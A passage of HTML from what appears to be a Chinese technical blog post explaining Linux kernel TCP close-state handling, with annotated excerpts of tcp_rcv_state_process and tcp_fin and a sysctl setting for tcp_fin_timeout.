data-line=\"crayon-5bab670f9f94f080699720-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f94f080699720-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f94f080699720-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f94f080699720-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f94f080699720-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f94f080699720-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f94f080699720-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f94f080699720-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f94f080699720-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f94f080699720-23\">23</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f94f080699720-24\">24</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f94f080699720-25\">25</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f94f080699720-26\">26</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f94f080699720-27\">27</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f94f080699720-28\">28</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f94f080699720-29\">29</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f94f080699720-30\">30</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f94f080699720-31\">31</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f94f080699720-32\">32</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f94f080699720-33\">33</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670f9f94f080699720-1\"><span class=\"crayon-v\">tcp_v4_do_rcv</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f94f080699720-2\"><span class=\"crayon-h\">\t</span><span class=\"crayon-o\">|</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">tcp_rcv_state_process</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f94f080699720-3\"><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">tcp_rcv_state_process</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">struct</span><span class=\"crayon-h\"> </span><span class=\"crayon-e \">sock *</span><span class=\"crayon-v\">sk</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">struct</span><span class=\"crayon-h\"> </span><span class=\"crayon-e \">sk_buff *</span><span class=\"crayon-v\">skb</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">struct</span><span class=\"crayon-h\"> </span><span class=\"crayon-e \">tcphdr *</span><span class=\"crayon-v\">th</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">unsigned</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">len</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\">\t</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f94f080699720-4\"><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f94f080699720-5\"><span class=\"crayon-h\">\t</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f94f080699720-6\"><span class=\"crayon-h\">\t</span><span class=\"crayon-c\">/* step 5: check the ACK field */</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f94f080699720-7\"><span class=\"crayon-h\">\t</span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">th</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">ack</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f94f080699720-8\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f94f080699720-9\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-st\">case</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">TCP_FIN_WAIT1</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f94f080699720-10\"><span class=\"crayon-h\">\t\t\t</span><span class=\"crayon-c\">// 这处判断是确认此ack是发送Fin包对应的那个ack</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f94f080699720-11\"><span class=\"crayon-h\">\t\t\t</span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">tp</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">snd_una</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">==</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">tp</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">write_seq</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f94f080699720-12\"><span class=\"crayon-h\">\t\t\t\t</span><span class=\"crayon-c\">// 设置为FIN_WAIT2状态</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f94f080699720-13\"><span class=\"crayon-h\">\t\t\t\t</span><span class=\"crayon-e\">tcp_set_state</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">sk</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">TCP_FIN_WAIT2</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f94f080699720-14\"><span class=\"crayon-h\">\t\t\t\t</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f94f080699720-15\"><span class=\"crayon-h\">\t\t\t\t</span><span class=\"crayon-c\">// 设定TCP_FIN_WAIT2定时器，将在tmo时间到期后将状态变迁为TIME_WAIT</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f94f080699720-16\"><span class=\"crayon-h\">\t\t\t\t</span><span class=\"crayon-c\">// 不过是这时候改的已经是inet_timewait_sock了</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f94f080699720-17\"><span class=\"crayon-h\">\t\t\t\t</span><span class=\"crayon-e\">tcp_time_wait</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">sk</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">TCP_FIN_WAIT2</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">tmo</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f94f080699720-18\"><span class=\"crayon-h\">\t\t\t\t</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f94f080699720-19\"><span class=\"crayon-h\">\t\t\t</span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f94f080699720-20\"><span class=\"crayon-h\">\t</span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f94f080699720-21\"><span class=\"crayon-h\">\t</span><span class=\"crayon-c\">/* step 7: process the segment text */</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f94f080699720-22\"><span class=\"crayon-h\">\t</span><span class=\"crayon-st\">switch</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">sk</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">sk_state</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f94f080699720-23\"><span class=\"crayon-h\">\t</span><span class=\"crayon-st\">case</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">TCP_FIN_WAIT1</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f94f080699720-24\"><span class=\"crayon-h\">\t</span><span class=\"crayon-st\">case</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">TCP_FIN_WAIT2</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f94f080699720-25\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f94f080699720-26\"><span class=\"crayon-h\">\t</span><span class=\"crayon-st\">case</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">TCP_ESTABLISHED</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f94f080699720-27\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-e\">tcp_data_queue</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">sk</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">skb</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f94f080699720-28\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-v\">queued</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f94f080699720-29\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-st\">break</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f94f080699720-30\"><span class=\"crayon-h\">\t</span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f94f080699720-31\"><span class=\"crayon-h\">\t</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f94f080699720-32\"><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f94f080699720-33\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0039 seconds] -->\r\n<p>值的注意的是，从TCP_FIN_WAIT1变迁到TCP_FIN_WAIT2之后，还调用tcp_time_wait设置一个TCP_FIN_WAIT2定时器，在tmo+(2MSL或者基于RTO计算超时)超时后会直接变迁到closed状态(不过此时已经是inet_timewait_sock了）。这个超时时间可以配置,如果是ipv4的话,则可以按照下列配置:</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670f9f953510780822\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nnet.ipv4.tcp_fin_timeout   \r\n/sbin/sysctl -w net.ipv4.tcp_fin_timeout=30\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f953510780822-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f953510780822-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f953510780822-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670f9f953510780822-1\"><span class=\"crayon-v\">net</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">ipv4</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">tcp_fin_timeout</span><span class=\"crayon-h\">   </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f953510780822-2\"><span class=\"crayon-o\">/</span><span class=\"crayon-v\">sbin</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">sysctl</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">w</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">net</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">ipv4</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">tcp_fin_timeout</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">30</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f953510780822-3\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0008 seconds] -->\r\n<p>如下图所示: <img title=\"在这里输入图片标题\" src=\"http://jbcdn2.b0.upaiyun.com/2018/08/c0a38a471937060862f4723c5e433869.png\" alt=\"输入图片说明\"><br>\n有这样一步的原因是防止对端由于种种原因始终没有发送fin,防止一直处于FIN_WAIT2状态。</p>\n<p>接着在FIN_WAIT2状态等待对端的FIN，完成后面两次挥手: <img title=\"在这里输入图片标题\" src=\"http://jbcdn2.b0.upaiyun.com/2018/08/b19fd82ba32d1906cadbca2e830292d9.png\" alt=\"输入图片说明\"><br>\n由Step1和Step2将状态置为了FIN_WAIT_2，然后接收到对端发送的FIN之后,将会将状态设置为time_wait,如下代码所示:</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670f9f957152005167\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ntcp_v4_do_rcv\r\n\t|-tcp_rcv_state_process\r\n\t\t|-tcp_data_queue\r\n\t\t\t\t|-tcp_fin\r\nstatic void tcp_fin(struct sk_buff *skb, struct sock *sk, struct tcphdr *th)\r\n{\r\n\tswitch (sk-&gt;sk_state) {\r\n\t\t......\t\r\n\t\tcase TCP_FIN_WAIT1:\r\n\t\t\t// 这边是处理同时关闭的情况\r\n\t\t\ttcp_send_ack(sk);\r\n\t\t\ttcp_set_state(sk, TCP_CLOSING);\r\n\t\t\tbreak;\r\n\t\tcase TCP_FIN_WAIT2:\r\n\t\t\t/* Received a FIN -- send ACK and enter TIME_WAIT. */\r\n\t\t\t// 收到FIN之后，发送ACK同时将状态进入TIME_WAIT\r\n\t\t\ttcp_send_ack(sk);\r\n\t\t\ttcp_time_wait(sk, TCP_TIME_WAIT, 0);\r\n\t}\r\n}\t\t   \r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f957152005167-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f957152005167-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f957152005167-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f957152005167-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f957152005167-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f957152005167-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f957152005167-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f957152005167-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f957152005167-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f957152005167-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f957152005167-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f957152005167-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f957152005167-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f957152005167-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f957152005167-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f957152005167-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f957152005167-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f957152005167-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f957152005167-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f957152005167-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f957152005167-21\">21</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670f9f957152005167-1\"><span class=\"crayon-v\">tcp_v4_do_rcv</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f957152005167-2\"><span class=\"crayon-h\">\t</span><span class=\"crayon-o\">|</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">tcp_rcv_state_process</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f957152005167-3\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-o\">|</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">tcp_data_queue</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f957152005167-4\"><span class=\"crayon-h\">\t\t\t\t</span><span class=\"crayon-o\">|</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">tcp_fin</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f957152005167-5\"><span class=\"crayon-m\">static</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">void</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">tcp_fin</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">struct</span><span class=\"crayon-h\"> </span><span class=\"crayon-e \">sk_buff *</span><span class=\"crayon-v\">skb</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">struct</span><span class=\"crayon-h\"> </span><span class=\"crayon-e \">sock *</span><span class=\"crayon-v\">sk</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">struct</span><span class=\"crayon-h\"> </span><span class=\"crayon-e \">tcphdr *</span><span class=\"crayon-v\">th</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f957152005167-6\"><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f957152005167-7\"><span class=\"crayon-h\">\t</span><span class=\"crayon-st\">switch</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">sk</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">sk_state</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f957152005167-8\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\">\t</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f957152005167-9\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-st\">case</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">TCP_FIN_WAIT1</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f957152005167-10\"><span class=\"crayon-h\">\t\t\t</span><span class=\"crayon-c\">// 这边是处理同时关闭的情况</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f957152005167-11\"><span class=\"crayon-h\">\t\t\t</span><span class=\"crayon-e\">tcp_send_ack</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">sk</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f957152005167-12\"><span class=\"crayon-h\">\t\t\t</span><span class=\"crayon-e\">tcp_set_state</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">sk</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">TCP_CLOSING</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f957152005167-13\"><span class=\"crayon-h\">\t\t\t</span><span class=\"crayon-st\">break</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f957152005167-14\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-st\">case</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">TCP_FIN_WAIT2</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f957152005167-15\"><span class=\"crayon-h\">\t\t\t</span><span class=\"crayon-c\">/* Received a FIN -- send ACK and enter TIME_WAIT. */</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f957152005167-16\"><span class=\"crayon-h\">\t\t\t</span><span class=\"crayon-c\">// 收到FIN之后，发送ACK同时将状态进入TIME_WAIT</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f957152005167-17\"><span class=\"crayon-h\">\t\t\t</span><span class=\"crayon-e\">tcp_send_ack</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">sk</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f957152005167-18\"><span class=\"crayon-h\">\t\t\t</span><span class=\"crayon-e\">tcp_time_wait</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">sk</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">TCP_TIME_WAIT</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f957152005167-19\"><span class=\"crayon-h\">\t</span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f957152005167-20\"><span class=\"crayon-sy\">}</span><span class=\"crayon-h\">\t\t   </span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f957152005167-21\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0027 seconds] -->\r\n<p>time_wait状态时，原socket会被destroy,然后新创建一个inet_timewait_sock,这样就能及时的将原socket使用的资源回收。而inet_timewait_sock被挂入一个bucket中，由 inet_twdr_twcal_tick定时从bucket中将超过(2MSL或者基于RTO计算的时间)的time_wait的实例删除。 我们来看下tcp_time_wait函数</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670f9f95a236446034\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; 